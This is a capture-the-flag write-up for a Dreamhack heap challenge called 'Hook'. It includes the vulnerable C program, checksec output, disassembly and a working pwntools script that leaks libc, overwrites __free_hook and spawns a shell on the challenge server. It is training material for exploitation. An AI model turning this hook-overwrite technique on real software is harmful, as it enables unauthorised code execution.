# Write-up of the challenge "Hook"

This challenge is part of the "Binary exploitation" category and is in **Level 1**.

# Goal of the challenge

The objective of this challenge is to use the **free hook** to call **system('/bin/sh')**

## Program structure

```
// gcc -o init_fini_array init_fini_array.c -Wl,-z,norelro
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    long *ptr;
    size_t size;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("Size: ");
    scanf("%ld", &size);

    ptr = malloc(size);

    printf("Data: ");
    read(0, ptr, size);


    *(long *)*ptr = *(ptr+1);

    free(ptr);
    free(ptr);

    system("/bin/sh");
    return 0;
}


```

## Security breach

The vulnerability here is:

```
*(long *)*ptr = *(ptr+1);
```

Since it makes the second pointer a value to the **free_hook** without any sanitization therefore we can just put **free_hook** and then the address of the **systen('/bin/sh')**.

## Problem

The libc doesn't work locally only remotly I suspect it is from the <a target="__blank" href="https://dreamhack.io/wargame/challenges/52">description</a>:

```
2023.04.27: Changes were made to the libc file.
2023.04.27: Dockerfile is provided.
```

## Solution

So first I started off by doing **checksec on the binary** and I got this in return:

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

Looks like PIE is off and that's good!

Checksec on the libc:

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
```

PIE is on but luckly we recieve the leak of stdout at the start in the binary:

```
printf("stdout: %p\n", stdout);
```

So our goal here is very simple. Just find the base throught subtracting the leak stdout with the libc's stdout. Then use that to get the **\_\_free_hook** and put **system_binish** in it. The cool thing is: After we put **system("/bin/sh")** into **\_\_free_hook**, the next time free() is called **(which happens immediately with free(ptr))**, it will jump to our shell code instead of freeing memory!

OBS, I used pwndbg to find the **system('/bin/sh')** adress:

```
0x0000000000400a11 < +199 >:   mov    edi, 0x400aeb -> shell
0x0000000000400a16 < +204 > :   call   0x400788 < system@plt >
0x0000000000400a1b < +209 >:   mov    eax, 0x0
0x0000000000400a20 < +214 >:   mov    rcx, QWORD PTR [rbp-0x8]
0x0000000000400a24 < +218 > :   xor    rcx, QWORD PTR fs: 0x28
0x0000000000400a2d < +227 > :   je     0x400a34 < main+234 >
0x0000000000400a2f < +229 > :   call   0x400780 < __stack_chk_fail@plt >
0x0000000000400a34 < +234 > :   leave
0x0000000000400a35 < +235 >:   ret
```

solve.py:

```
from pwn import *

# p = process("./hook")

p = remote("host3.dreamhack.games", 9182)

libc = ELF("libc-2.23.so")
stdout_offset = libc.symbols['_IO_2_1_stdout_']

p.recvuntil("stdout: ")
stdout_addr = int(p.recvline().strip().decode(), 16)
libc_base = stdout_addr - stdout_offset

free = libc_base + libc.symbols['__free_hook']

sys = 0x400a11

p.recvuntil('Size: ')
p.sendline(b'16')
p.recvuntil('Data: ')


payload = p64(free)
payload += p64(sys)
p.send(payload)

p.interactive()
```
